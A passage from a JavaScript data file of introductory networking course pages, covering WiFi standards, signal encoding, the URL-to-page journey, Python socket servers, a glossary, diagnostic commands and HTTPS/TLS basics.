            <li><strong>Single-mode (SMF)</strong> — one light path, very long distance</li>
            <li><strong>Multi-mode (MMF)</strong> — multiple light paths, shorter distance, cheaper</li>
          </ul>
        `
      },
      {
        // Page 4: WiFi 802.11
        titleEn: "WiFi — 802.11 Standards",
        contentEn: `
          <p><strong>WiFi</strong> uses radio waves to transmit data wirelessly.</p>
          <p>The standard is called <strong>IEEE 802.11</strong>.</p>
          <table>
            <thead>
              <tr><th>Standard</th><th>Name</th><th>Frequency</th><th>Max Speed</th></tr>
            </thead>
            <tbody>
              <tr><td>802.11n</td><td>WiFi 4</td><td>2.4 / 5 GHz</td><td>600 Mbps</td></tr>
              <tr><td>802.11ac</td><td>WiFi 5</td><td>5 GHz</td><td>3.5 Gbps</td></tr>
              <tr><td>802.11ax</td><td>WiFi 6</td><td>2.4 / 5 / 6 GHz</td><td>9.6 Gbps</td></tr>
            </tbody>
          </table>
          <p><strong>Key concepts:</strong></p>
          <ul>
            <li><strong>2.4 GHz</strong> — longer range, slower, more interference</li>
            <li><strong>5 GHz</strong> — shorter range, faster, less interference</li>
            <li><strong>SSID</strong> — the name of the WiFi network</li>
            <li><strong>WPA3</strong> — the latest WiFi security standard</li>
          </ul>
        `
      },
      {
        // Page 5: Encoding NRZ / Manchester
        titleEn: "Signal Encoding — NRZ and Manchester",
        contentEn: `
          <p>How do we represent 0s and 1s as electrical signals?</p>
          <p><strong>NRZ (Non-Return to Zero):</strong></p>
          <ul>
            <li>High voltage = 1, Low voltage = 0</li>
            <li>Simple, but has a problem: long runs of 1s or 0s lose synchronization</li>
          </ul>
          <p><strong>Manchester Encoding:</strong></p>
          <ul>
            <li>Each bit has a <strong>transition</strong> in the middle of the clock period</li>
            <li>Low→High = 1, High→Low = 0</li>
            <li>The transition acts as a built-in clock signal</li>
            <li>Used in 10BASE-T Ethernet</li>
          </ul>
          <p><strong>Why does this matter?</strong> The receiver needs to know when each bit starts and ends. Manchester encoding solves this by always changing the signal.</p>
        `
      },
      {
        // Page 6: Full/Half Duplex + CSMA/CD
        titleEn: "Duplex Modes and CSMA/CD",
        contentEn: `
          <p><strong>Half Duplex</strong> — only one side can send at a time.</p>
          <ul>
            <li>Like a walkie-talkie — you talk OR you listen</li>
            <li>Used with hubs</li>
          </ul>
          <p><strong>Full Duplex</strong> — both sides can send and receive at the same time.</p>
          <ul>
            <li>Like a phone call — both people can talk</li>
            <li>Used with switches — each port is full duplex</li>
          </ul>
          <p><strong>CSMA/CD</strong> (Carrier Sense Multiple Access / Collision Detection):</p>
          <ul>
            <li>Used in half-duplex Ethernet</li>
            <li><strong>Listen</strong> before sending — is the wire busy?</li>
            <li>If two devices send at the same time → <strong>collision</strong></li>
            <li>Both stop, wait a <strong>random time</strong>, then try again</li>
          </ul>
          <p>With full-duplex switches, CSMA/CD is not needed anymore.</p>
        `
      },
      {
        // Page 7: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 8: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li>The Physical Layer moves <strong>raw bits</strong> using electrical, light, or radio signals</li>
            <li><strong>Bandwidth</strong> = how much data per second; <strong>Latency</strong> = how long the delay</li>
            <li><strong>Copper, Fiber, WiFi</strong> — three main transmission technologies</li>
            <li><strong>Cat5e/Cat6</strong> cables with <strong>RJ-45</strong> connectors are most common</li>
            <li><strong>WiFi 802.11</strong> — versions n/ac/ax, frequencies 2.4 and 5 GHz</li>
            <li><strong>Manchester encoding</strong> solves clock synchronization</li>
            <li><strong>Full duplex</strong> (switches) replaced <strong>half duplex + CSMA/CD</strong> (hubs)</li>
          </ul>
        `
      },
      {
        // Page 9: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 11 ==========
  11: {
    titleEn: "How It All Connects",
    pages: [
      {
        // Page 0: Full browsing story
        titleEn: "The Full Journey — From URL to Web Page",
        contentEn: `
          <p>What happens when you type <code>https://www.example.com</code> and press Enter?</p>
          <p><strong>8 steps happen behind the scenes:</strong></p>
          <ol>
            <li><strong>DHCP</strong> — Your computer already got an IP address from the router when it connected</li>
            <li><strong>DNS query</strong> — Browser asks "What is the IP of www.example.com?" → gets <code>93.184.216.34</code></li>
            <li><strong>ARP</strong> — Computer needs the router's MAC address to send the packet out</li>
            <li><strong>TCP handshake</strong> — Three-way handshake (SYN → SYN-ACK → ACK) opens a connection</li>
            <li><strong>TLS handshake</strong> — Client and server agree on encryption keys (because HTTPS)</li>
            <li><strong>HTTP GET</strong> — Browser sends <code>GET /index.html</code> inside the encrypted tunnel</li>
            <li><strong>Server responds</strong> — Server sends back the HTML page</li>
            <li><strong>Browser renders</strong> — The HTML is parsed and displayed on screen</li>
          </ol>
          <p>All of this happens in <strong>less than one second</strong>.</p>
        `
      },
      {
        // Page 1: Wireshark view
        titleEn: "Seeing the Flow in Wireshark",
        contentEn: `
          <p>If we capture the traffic with <strong>Wireshark</strong>, we see the packets in order:</p>
          <table>
            <thead>
              <tr><th>#</th><th>Protocol</th><th>Description</th></tr>
            </thead>
            <tbody>
              <tr><td>1</td><td>DNS</td><td>Query: "What is the IP of www.example.com?"</td></tr>
              <tr><td>2</td><td>DNS</td><td>Response: 93.184.216.34</td></tr>
              <tr><td>3</td><td>TCP</td><td>SYN → (start of three-way handshake)</td></tr>
              <tr><td>4</td><td>TCP</td><td>SYN-ACK ←</td></tr>
              <tr><td>5</td><td>TCP</td><td>ACK →</td></tr>
              <tr><td>6-9</td><td>TLS</td><td>ClientHello, ServerHello, certificates, keys</td></tr>
              <tr><td>10</td><td>HTTP</td><td>GET /index.html (encrypted inside TLS)</td></tr>
              <tr><td>11</td><td>HTTP</td><td>200 OK + HTML content</td></tr>
            </tbody>
          </table>
          <p>Each line is a real packet that traveled through the network.</p>
        `
      },
      {
        // Page 2: Encapsulation order
        titleEn: "Encapsulation — Each Layer Adds a Header",
        contentEn: `
          <p>Data moves <strong>from top to bottom</strong> through the layers. Each layer <strong>wraps</strong> the data with its own header.</p>
          <ul>
            <li><strong>Application Layer</strong> — creates the HTTP request (e.g., GET /index.html)</li>
            <li><strong>Transport Layer</strong> — adds TCP header (source port, destination port, sequence number)</li>
            <li><strong>Network Layer</strong> — adds IP header (source IP, destination IP)</li>
            <li><strong>Data Link Layer</strong> — adds Ethernet header (source MAC, destination MAC) + trailer</li>
            <li><strong>Physical Layer</strong> — converts everything to bits on the wire</li>
          </ul>
          <p><strong>The result:</strong></p>
          <p><code>[Ethernet Header | IP Header | TCP Header | HTTP Data | Ethernet Trailer]</code></p>
          <p>On the other side, the layers <strong>unwrap</strong> the headers from bottom to top.</p>
        `
      },
      {
        // Page 3: CDN
        titleEn: "CDN — Content Delivery Network",
        contentEn: `
          <p>What happens when the server is behind a <strong>CDN</strong>?</p>
          <p>A CDN is a network of servers around the world that <strong>cache copies</strong> of website content.</p>
          <ul>
            <li>You type <code>www.example.com</code> in your browser</li>
            <li>DNS resolves to the <strong>nearest CDN server</strong>, not the original server</li>
            <li>If the CDN has a cached copy → it responds directly (<strong>cache hit</strong>)</li>
            <li>If not → the CDN fetches from the origin server, caches it, then responds (<strong>cache miss</strong>)</li>
          </ul>
          <p><strong>Benefits of CDN:</strong></p>
          <ul>
            <li><strong>Lower latency</strong> — the server is closer to the user</li>
            <li><strong>Less load</strong> — the origin server handles fewer requests</li>
            <li><strong>DDoS protection</strong> — CDN absorbs attack traffic</li>
          </ul>
          <p>Popular CDNs: <strong>Cloudflare</strong>, <strong>Akamai</strong>, <strong>AWS CloudFront</strong>.</p>
        `
      },
      {
        // Page 4: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 5: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li>Browsing a website involves <strong>8 steps</strong>: DHCP, DNS, ARP, TCP, TLS, HTTP, response, render</li>
            <li>Wireshark lets you see every packet in the flow</li>
            <li><strong>Encapsulation</strong> — each layer adds its own header around the data</li>
            <li><strong>CDN</strong> caches content on servers close to users for faster loading</li>
            <li>All layers work together to deliver a web page in under one second</li>
          </ul>
        `
      },
      {
        // Page 6: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 12 ==========
  12: {
    titleEn: "Advanced Socket Programming",
    pages: [
      {
        // Page 0: Multiple clients problem
        titleEn: "The Problem — Handling Multiple Clients",
        contentEn: `
          <p>In basic socket programming, the server handles <strong>one client at a time</strong>.</p>
          <p>While talking to Client A, Client B has to <strong>wait</strong>.</p>
          <p><strong>Why is this a problem?</strong></p>
          <ul>
            <li>A web server needs to handle hundreds of users at once</li>
            <li>A chat server must receive and send messages to many users</li>
            <li>Blocking on one client = all others are stuck</li>
          </ul>
          <p><strong>Three solutions:</strong></p>
          <ol>
            <li><strong>select()</strong> — check multiple sockets at once</li>
            <li><strong>Threading</strong> — create a new thread for each client</li>
            <li><strong>asyncio</strong> — modern async/await approach</li>
          </ol>
        `
      },
      {
        // Page 1: select()
        titleEn: "select() — Monitoring Multiple Sockets",
        contentEn: `
          <p><code>select()</code> lets you watch multiple sockets and know which ones are <strong>ready to read</strong>.</p>
          <ul>
            <li>You give it a list of sockets</li>
            <li>It blocks until at least one socket has data</li>
            <li>Then you handle only the ready sockets</li>
          </ul>
          <p><strong>How it works:</strong></p>
          <ol>
            <li>Create a list of sockets to monitor</li>
            <li>Call <code>select.select(read_list, write_list, error_list)</code></li>
            <li>It returns which sockets are ready</li>
            <li>If the server socket is ready → accept a new client</li>
            <li>If a client socket is ready → read the message</li>
          </ol>
          <p><strong>Advantage:</strong> one thread handles many clients. <strong>Disadvantage:</strong> the code can be complex.</p>
        `
      },
      {
        // Page 2: select() demo code
        titleEn: "Demo — select() Server",
        contentEn: `
          <p>A simple chat server using <code>select()</code>:</p>
<pre><code>import socket, select

server = socket.socket()
server.bind(("0.0.0.0", 9000))
server.listen(5)

sockets_list = [server]
clients = {}

while True:
    ready, _, _ = select.select(sockets_list, [], [])
    for s in ready:
        if s is server:
            client, addr = server.accept()
            sockets_list.append(client)
            clients[client] = addr
            print(f"New client: {addr}")
        else:
            data = s.recv(1024)
            if not data:
                sockets_list.remove(s)
                del clients[s]
                s.close()
            else:
                print(f"{clients[s]}: {data.decode()}")
</code></pre>
          <p>This server handles many clients in a <strong>single thread</strong>.</p>
        `
      },
      {
        // Page 3: Threading demo code
        titleEn: "Demo — Threading Server",
        contentEn: `
          <p>Another approach: create a <strong>new thread</strong> for each client.</p>
<pre><code>import socket
import threading

def handle_client(client, addr):
    while True:
        data = client.recv(1024)
        if not data:
            break
        print(f"{addr}: {data.decode()}")
    client.close()

server = socket.socket()
server.bind(("0.0.0.0", 9000))
server.listen(5)

while True:
    client, addr = server.accept()
    t = threading.Thread(target=handle_client,
                         args=(client, addr))
    t.start()
</code></pre>
          <p><strong>Advantage:</strong> simple code, each client runs independently.</p>
          <p><strong>Disadvantage:</strong> many threads use a lot of memory. Not good for thousands of clients.</p>
        `
      },
      {
        // Page 4: Python 3 encoding/bytes
        titleEn: "Python 3 — Strings vs Bytes",
        contentEn: `
          <p>In Python 3, <strong>strings</strong> and <strong>bytes</strong> are different types.</p>
          <ul>
            <li><code>"hello"</code> — a string (text, Unicode)</li>
            <li><code>b"hello"</code> — bytes (raw data)</li>
          </ul>
          <p><strong>Sockets send and receive bytes, not strings.</strong></p>
          <p>You must convert between them:</p>
<pre><code># String → Bytes (encoding)
text = "Hello!"
data = text.encode("utf-8")  # b"Hello!"

# Bytes → String (decoding)
data = b"Hello!"
text = data.decode("utf-8")  # "Hello!"
</code></pre>
          <p><strong>Common mistake:</strong> sending a string without <code>.encode()</code> → <code>TypeError</code>.</p>
          <p><strong>Tip:</strong> Always use <code>utf-8</code> encoding. It supports all languages.</p>
        `
      },
      {
        // Page 5: Length prefix protocol
        titleEn: "Length Prefix Protocol",
        contentEn: `
          <p>TCP is a <strong>stream</strong> — it does not have message boundaries.</p>
          <p>If you send "Hello" then "World", the receiver might get "HelloWorld" in one read.</p>
          <p><strong>Solution: Length prefix</strong></p>
          <ul>
            <li>Before each message, send its <strong>length as a fixed-size header</strong></li>
            <li>The receiver first reads the length, then reads exactly that many bytes</li>
          </ul>
<pre><code># Sender
msg = "Hello!".encode()
length = len(msg).to_bytes(4, "big")  # 4-byte header
sock.send(length + msg)

# Receiver
raw_len = sock.recv(4)
msg_len = int.from_bytes(raw_len, "big")
data = sock.recv(msg_len)
print(data.decode())  # "Hello!"
</code></pre>
          <p>This pattern is used in many real protocols.</p>
        `
      },
      {
        // Page 6: asyncio
        titleEn: "asyncio — Modern Async Programming",
        contentEn: `
          <p><strong>asyncio</strong> is Python's built-in library for asynchronous programming.</p>
          <ul>
            <li>Uses <code>async</code> and <code>await</code> keywords</li>
            <li>One thread, but switches between tasks while waiting for I/O</li>
            <li>Can handle thousands of connections efficiently</li>
          </ul>
<pre><code>import asyncio

async def handle_client(reader, writer):
    data = await reader.read(1024)
    message = data.decode()
    print(f"Received: {message}")
    writer.write(b"Got it!")
    await writer.drain()
    writer.close()

async def main():
    server = await asyncio.start_server(
        handle_client, "0.0.0.0", 9000)
    async with server:
        await server.serve_forever()

asyncio.run(main())
</code></pre>
          <p><strong>asyncio</strong> is the recommended approach for modern Python servers.</p>
        `
      },
      {
        // Page 7: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li>A basic server can only handle <strong>one client at a time</strong> — not useful in practice</li>
            <li><strong>select()</strong> — monitors multiple sockets in one thread</li>
            <li><strong>Threading</strong> — one thread per client, simple but uses more memory</li>
            <li><strong>asyncio</strong> — modern async/await, handles thousands of clients efficiently</li>
            <li>Python 3: sockets use <strong>bytes</strong>, not strings — use <code>.encode()</code> and <code>.decode()</code></li>
            <li><strong>Length prefix</strong> solves TCP's stream problem — send the message length before the message</li>
          </ul>
        `
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 13 ==========
  13: {
    titleEn: "Glossary of Terms",
    pages: [
      {
        // Page 0: A-F
        titleEn: "Glossary: A – F",
        contentEn: `
          <table>
            <thead><tr><th>Term</th><th>Definition</th></tr></thead>
            <tbody>
              <tr><td><strong>ACK</strong></td><td>Acknowledgment — a message confirming data was received</td></tr>
              <tr><td><strong>ARP</strong></td><td>Address Resolution Protocol — finds the MAC address for a given IP</td></tr>
              <tr><td><strong>Bandwidth</strong></td><td>Maximum amount of data that can travel per second (bps)</td></tr>
              <tr><td><strong>Broadcast</strong></td><td>Sending a message to all devices on the network</td></tr>
              <tr><td><strong>CDN</strong></td><td>Content Delivery Network — servers around the world that cache content</td></tr>
              <tr><td><strong>CIDR</strong></td><td>Classless Inter-Domain Routing — flexible way to define network size (e.g., /24)</td></tr>
              <tr><td><strong>Client</strong></td><td>A device or program that requests a service from a server</td></tr>
              <tr><td><strong>CSMA/CD</strong></td><td>Collision detection method used in half-duplex Ethernet</td></tr>
              <tr><td><strong>DHCP</strong></td><td>Dynamic Host Configuration Protocol — automatically gives IP addresses to devices</td></tr>
              <tr><td><strong>DNS</strong></td><td>Domain Name System — translates domain names to IP addresses</td></tr>
              <tr><td><strong>Encapsulation</strong></td><td>Each layer wraps data with its own header before sending</td></tr>
              <tr><td><strong>Ethernet</strong></td><td>The most common wired LAN technology (IEEE 802.3)</td></tr>
              <tr><td><strong>Firewall</strong></td><td>Filters network traffic based on allow/block rules</td></tr>
              <tr><td><strong>FTP</strong></td><td>File Transfer Protocol — sends files between computers (port 21)</td></tr>
              <tr><td><strong>Full Duplex</strong></td><td>Both sides can send and receive at the same time</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 1: G-M
        titleEn: "Glossary: G – M",
        contentEn: `
          <table>
            <thead><tr><th>Term</th><th>Definition</th></tr></thead>
            <tbody>
              <tr><td><strong>Gateway</strong></td><td>A device that connects two different networks (usually the router)</td></tr>
              <tr><td><strong>HTTP</strong></td><td>HyperText Transfer Protocol — the protocol for web pages (port 80)</td></tr>
              <tr><td><strong>HTTPS</strong></td><td>HTTP over TLS — encrypted web traffic (port 443)</td></tr>
              <tr><td><strong>Hub</strong></td><td>Layer 1 device that sends data to all ports</td></tr>
              <tr><td><strong>ICMP</strong></td><td>Internet Control Message Protocol — used by ping and traceroute</td></tr>
              <tr><td><strong>IP Address</strong></td><td>A unique number that identifies a device on a network (e.g., 192.168.1.1)</td></tr>
              <tr><td><strong>IPv4</strong></td><td>IP version 4 — 32-bit addresses (4.3 billion possible)</td></tr>
              <tr><td><strong>IPv6</strong></td><td>IP version 6 — 128-bit addresses (practically unlimited)</td></tr>
              <tr><td><strong>ISP</strong></td><td>Internet Service Provider — the company that gives you Internet access</td></tr>
              <tr><td><strong>LAN</strong></td><td>Local Area Network — a small network (home, office)</td></tr>
              <tr><td><strong>Latency</strong></td><td>The time delay for data to travel from source to destination</td></tr>
              <tr><td><strong>MAC Address</strong></td><td>Media Access Control — a unique hardware address for each network card</td></tr>
              <tr><td><strong>MTU</strong></td><td>Maximum Transmission Unit — largest packet size allowed (usually 1500 bytes)</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 2: N-T
        titleEn: "Glossary: N – T",
        contentEn: `
          <table>
            <thead><tr><th>Term</th><th>Definition</th></tr></thead>
            <tbody>
              <tr><td><strong>NAT</strong></td><td>Network Address Translation — maps private IPs to one public IP</td></tr>
              <tr><td><strong>OSI Model</strong></td><td>7-layer reference model for networking (Physical → Application)</td></tr>
              <tr><td><strong>Packet</strong></td><td>A small piece of data sent over a network</td></tr>
              <tr><td><strong>Ping</strong></td><td>A tool that sends ICMP echo requests to test connectivity</td></tr>
              <tr><td><strong>Port</strong></td><td>A number (0–65535) that identifies a specific service on a device</td></tr>
              <tr><td><strong>Protocol</strong></td><td>A set of rules for how devices communicate</td></tr>
              <tr><td><strong>Router</strong></td><td>Layer 3 device that forwards packets between networks using IP addresses</td></tr>
              <tr><td><strong>Server</strong></td><td>A device or program that provides services to clients</td></tr>
              <tr><td><strong>SMTP</strong></td><td>Simple Mail Transfer Protocol — sends email (port 25/587)</td></tr>
              <tr><td><strong>SSH</strong></td><td>Secure Shell — encrypted remote access (port 22)</td></tr>
              <tr><td><strong>Subnet Mask</strong></td><td>Defines which part of an IP is the network and which is the host</td></tr>
              <tr><td><strong>Switch</strong></td><td>Layer 2 device that forwards frames based on MAC addresses</td></tr>
              <tr><td><strong>TCP</strong></td><td>Transmission Control Protocol — reliable, ordered delivery (connection-based)</td></tr>
              <tr><td><strong>TLS</strong></td><td>Transport Layer Security — encrypts data in transit (used by HTTPS)</td></tr>
              <tr><td><strong>TTL</strong></td><td>Time to Live — limits how many hops a packet can take</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 3: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 14 ==========
  14: {
    titleEn: "Commands and Tools",
    pages: [
      {
        // Page 0: Common commands
        titleEn: "Essential Network Commands",
        contentEn: `
          <p>These commands help you check and troubleshoot networks:</p>
          <table>
            <thead><tr><th>Command</th><th>What it does</th><th>Example</th></tr></thead>
            <tbody>
              <tr><td><code>ping</code></td><td>Tests if a host is reachable</td><td><code>ping google.com</code></td></tr>
              <tr><td><code>tracert</code> / <code>traceroute</code></td><td>Shows the path packets take to a destination</td><td><code>tracert google.com</code></td></tr>
              <tr><td><code>netstat</code></td><td>Shows active connections and open ports</td><td><code>netstat -an</code></td></tr>
              <tr><td><code>ipconfig</code> / <code>ifconfig</code></td><td>Shows your IP address and network settings</td><td><code>ipconfig /all</code></td></tr>
              <tr><td><code>nslookup</code></td><td>Queries DNS — finds the IP of a domain</td><td><code>nslookup google.com</code></td></tr>
              <tr><td><code>arp -a</code></td><td>Shows the ARP table (IP → MAC mappings)</td><td><code>arp -a</code></td></tr>
            </tbody>
          </table>
          <p><strong>Tip:</strong> Windows uses <code>ipconfig</code> and <code>tracert</code>. Linux/Mac uses <code>ifconfig</code> and <code>traceroute</code>.</p>
        `
      },
      {
        // Page 1: Demo output examples
        titleEn: "Demo — Command Output Examples",
        contentEn: `
          <p><strong>ping google.com:</strong></p>
<pre><code>Pinging google.com [142.250.74.46] with 32 bytes of data:
Reply from 142.250.74.46: bytes=32 time=12ms TTL=118
Reply from 142.250.74.46: bytes=32 time=11ms TTL=118
</code></pre>
          <p>→ The server is reachable, latency is ~12 ms.</p>

          <p><strong>nslookup google.com:</strong></p>
<pre><code>Server:   192.168.1.1
Address:  192.168.1.1#53

Name:     google.com
Address:  142.250.74.46
</code></pre>
          <p>→ DNS resolved google.com to 142.250.74.46.</p>

          <p><strong>netstat -an (partial):</strong></p>
<pre><code>Proto  Local Address     Foreign Address    State
TCP    192.168.1.5:54321  142.250.74.46:443  ESTABLISHED
TCP    192.168.1.5:54322  52.6.120.34:80     TIME_WAIT
</code></pre>
          <p>→ Shows active connections to remote servers.</p>
        `
      },
      {
        // Page 2: Tools
        titleEn: "Network Tools — Wireshark, Scapy, Telnet",
        contentEn: `
          <p><strong>Wireshark</strong></p>
          <ul>
            <li>A GUI tool that <strong>captures and analyzes</strong> network packets</li>
            <li>Shows every packet in detail — headers, payload, timing</li>
            <li>Filters: <code>http</code>, <code>tcp.port == 443</code>, <code>ip.addr == 192.168.1.5</code></li>
            <li>Essential for debugging network problems</li>
          </ul>
          <p><strong>Scapy</strong></p>
          <ul>
            <li>A Python library for <strong>creating and sending</strong> custom packets</li>
            <li>Can build packets from scratch — any protocol, any field</li>
            <li>Used for testing, security research, and learning</li>
          </ul>
          <p><strong>Telnet</strong></p>
          <ul>
            <li>A simple tool to connect to a port and send text</li>
            <li>Example: <code>telnet google.com 80</code> then type <code>GET / HTTP/1.1</code></li>
            <li><strong>Not encrypted</strong> — do not use for real logins</li>
          </ul>
        `
      },
      {
        // Page 3: More commands
        titleEn: "More Useful Commands",
        contentEn: `
          <table>
            <thead><tr><th>Command</th><th>What it does</th><th>Example</th></tr></thead>
            <tbody>
              <tr><td><code>route print</code> / <code>ip route</code></td><td>Shows the routing table</td><td><code>route print</code> (Windows)</td></tr>
              <tr><td><code>hostname</code></td><td>Shows the computer's name</td><td><code>hostname</code></td></tr>
              <tr><td><code>curl</code></td><td>Sends HTTP requests from the command line</td><td><code>curl https://api.example.com</code></td></tr>
              <tr><td><code>dig</code></td><td>Advanced DNS query tool (Linux)</td><td><code>dig google.com MX</code></td></tr>
              <tr><td><code>ss</code></td><td>Modern replacement for netstat (Linux)</td><td><code>ss -tuln</code></td></tr>
            </tbody>
          </table>
          <p><strong>curl</strong> is especially useful for testing APIs:</p>
<pre><code>curl -v https://www.google.com
# Shows the full HTTP request and response headers
</code></pre>
        `
      },
      {
        // Page 4: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><code>ping</code> — tests if a host is reachable</li>
            <li><code>tracert</code> — shows the path to a destination</li>
            <li><code>netstat</code> / <code>ss</code> — shows active connections</li>
            <li><code>ipconfig</code> / <code>ifconfig</code> — shows network settings</li>
            <li><code>nslookup</code> / <code>dig</code> — queries DNS</li>
            <li><code>arp -a</code> — shows IP to MAC mappings</li>
            <li><strong>Wireshark</strong> — captures and analyzes packets (GUI)</li>
            <li><strong>Scapy</strong> — creates custom packets (Python)</li>
            <li><code>curl</code> — sends HTTP requests from the terminal</li>
          </ul>
        `
      },
      {
        // Page 5: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 15 ==========
  15: {
    titleEn: "HTTPS and TLS — Encrypted Communication",
    pages: [
      {
        // Page 0: Why encryption
        titleEn: "Why Do We Need Encryption?",
        contentEn: `
          <p>Without encryption, anyone on the network can <strong>read your data</strong>.</p>
          <ul>
            <li>On public WiFi, an attacker can capture all traffic</li>
            <li>Your passwords, messages, and credit card numbers are visible</li>
            <li>This is called a <strong>Man-in-the-Middle (MITM)</strong> attack</li>
          </ul>
          <p><strong>HTTP</strong> (port 80) sends everything in <strong>plain text</strong>.</p>
          <p><strong>HTTPS</strong> (port 443) encrypts everything using <strong>TLS</strong>.</p>
          <ul>
            <li>Even if someone captures your traffic, they see only random bytes</li>
            <li>Today, over <strong>95%</strong> of web traffic uses HTTPS</li>
            <li>Browsers show a 🔒 lock icon for HTTPS sites</li>
          </ul>
        `
      },
      {
        // Page 1: Symmetric vs Asymmetric
        titleEn: "Symmetric vs Asymmetric Encryption",
        contentEn: `
          <p><strong>Symmetric encryption</strong> — one key for both sides.</p>
          <ul>
            <li>Same key encrypts and decrypts</li>
            <li>Fast — used for the actual data</li>
            <li>Problem: how do you share the key safely?</li>
            <li>Examples: <strong>AES</strong>, <strong>ChaCha20</strong></li>
          </ul>
          <p><strong>Asymmetric encryption</strong> — two keys: public + private.</p>
          <ul>
            <li><strong>Public key</strong> — anyone can have it, used to encrypt</li>
            <li><strong>Private key</strong> — kept secret, used to decrypt</li>
            <li>Slow — used only to exchange the symmetric key</li>
            <li>Examples: <strong>RSA</strong>, <strong>ECDHE</strong></li>
          </ul>
          <p><strong>TLS uses both:</strong> asymmetric to exchange a key, then symmetric for the data.</p>
        `
      },
      {
        // Page 2: TLS Handshake
        titleEn: "TLS Handshake — Step by Step",
        contentEn: `
          <p>Before encrypted data can flow, client and server do a <strong>TLS handshake</strong>:</p>
          <ol>
            <li><strong>ClientHello</strong> — client sends: supported TLS versions, cipher suites, random number</li>
            <li><strong>ServerHello</strong> — server picks a TLS version and cipher suite, sends its random number</li>
            <li><strong>Certificate</strong> — server sends its certificate (contains the public key)</li>
            <li><strong>Key Exchange</strong> — both sides generate a shared secret using ECDHE</li>
            <li><strong>Finished</strong> — both sides confirm the handshake, switch to encrypted communication</li>
          </ol>
          <p><strong>After the handshake:</strong></p>
          <ul>
            <li>Both sides have the same <strong>session key</strong> (symmetric)</li>
            <li>All data is encrypted with this key</li>
            <li>The handshake takes 1-2 round trips (~50-100 ms)</li>
          </ul>
        `
      },
      {
        // Page 3: Certificates and CA
        titleEn: "Certificates and Chain of Trust",
        contentEn: `
          <p>How does your browser know the server is really google.com?</p>
          <p><strong>Certificates</strong> prove identity. A certificate contains:</p>
          <ul>
            <li>The domain name (e.g., google.com)</li>
            <li>The public key</li>
            <li>Who issued it (the CA)</li>
            <li>Expiration date</li>
          </ul>
          <p><strong>CA (Certificate Authority)</strong> — a trusted organization that signs certificates.</p>
          <p><strong>Chain of trust:</strong></p>
          <ol>
            <li><strong>Root CA</strong> — built into your browser/OS (e.g., DigiCert, Let's Encrypt)</li>
            <li><strong>Intermediate CA</strong> — signed by the Root CA</li>
            <li><strong>Server certificate</strong> — signed by the Intermediate CA</li>
          </ol>
          <p>The browser checks the chain: server cert → intermediate → root. If the root is trusted, the connection is safe.</p>
          <p><strong>Let's Encrypt</strong> provides free certificates — most websites use it today.</p>
        `
      },
      {
        // Page 4: Demo Python HTTPS
        titleEn: "Demo — Python HTTPS Request",
        contentEn: `
          <p>Making an HTTPS request in Python is simple with the <code>requests</code> library:</p>
<pre><code>import requests

# Simple HTTPS GET request
response = requests.get("https://api.github.com")
print(response.status_code)   # 200
print(response.json())        # JSON response

# Check the certificate
print(response.url)           # https://api.github.com/
</code></pre>
          <p><strong>What happens behind the scenes:</strong></p>
          <ul>
            <li>Python does the full TLS handshake automatically</li>
            <li>It verifies the server certificate against known CAs</li>
            <li>All data is encrypted — safe to send passwords and tokens</li>
          </ul>
<pre><code># You can also check certificate details:
import ssl, socket

ctx = ssl.create_default_context()
with ctx.wrap_socket(socket.socket(),
                     server_hostname="google.com") as s:
    s.connect(("google.com", 443))
    cert = s.getpeercert()
    print(cert["subject"])
</code></pre>
        `
      },
      {
        // Page 5: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 6: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>HTTP</strong> is plain text — anyone can read it. <strong>HTTPS</strong> encrypts everything</li>
            <li><strong>Symmetric</strong> encryption (AES) is fast — used for data</li>
            <li><strong>Asymmetric</strong> encryption (RSA/ECDHE) — used to exchange the symmetric key</li>
            <li>The <strong>TLS handshake</strong> establishes a secure connection in 5 steps</li>
            <li><strong>Certificates</strong> prove the server's identity — signed by a trusted CA</li>
            <li><strong>Chain of trust</strong>: server cert → intermediate CA → root CA</li>
            <li>Python's <code>requests</code> library handles TLS automatically</li>
          </ul>
        `
      },
      {
        // Page 7: simulation — SKIP
        titleEn: "Simulation",
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 16 ==========
  16: {
    titleEn: "Application Protocols — Email, FTP, SSH",
    pages: [
      {
        // Page 0: Email protocols
        titleEn: "Email — SMTP, IMAP, POP3",
        contentEn: `
          <p>Email uses three protocols:</p>
          <p><strong>SMTP</strong> (Simple Mail Transfer Protocol) — <strong>sends</strong> email.</p>
          <ul>
            <li>Port 25 (server-to-server) or 587 (client-to-server, with TLS)</li>
            <li>Your email client uses SMTP to send a message to your mail server</li>
            <li>Your mail server uses SMTP to deliver it to the recipient's server</li>
          </ul>
          <p><strong>IMAP</strong> (Internet Message Access Protocol) — <strong>reads</strong> email.</p>
          <ul>
            <li>Port 993 (with TLS)</li>
            <li>Email stays on the server — you can read it from multiple devices</li>
            <li>Supports folders, search, and flags</li>
          </ul>
          <p><strong>POP3</strong> (Post Office Protocol) — <strong>downloads</strong> email.</p>
          <ul>
            <li>Port 995 (with TLS)</li>
            <li>Downloads email to your device and <strong>deletes it from the server</strong></li>
            <li>Simple but only works on one device</li>
          </ul>
        `
      },
      {
        // Page 1: Demo Python SMTP
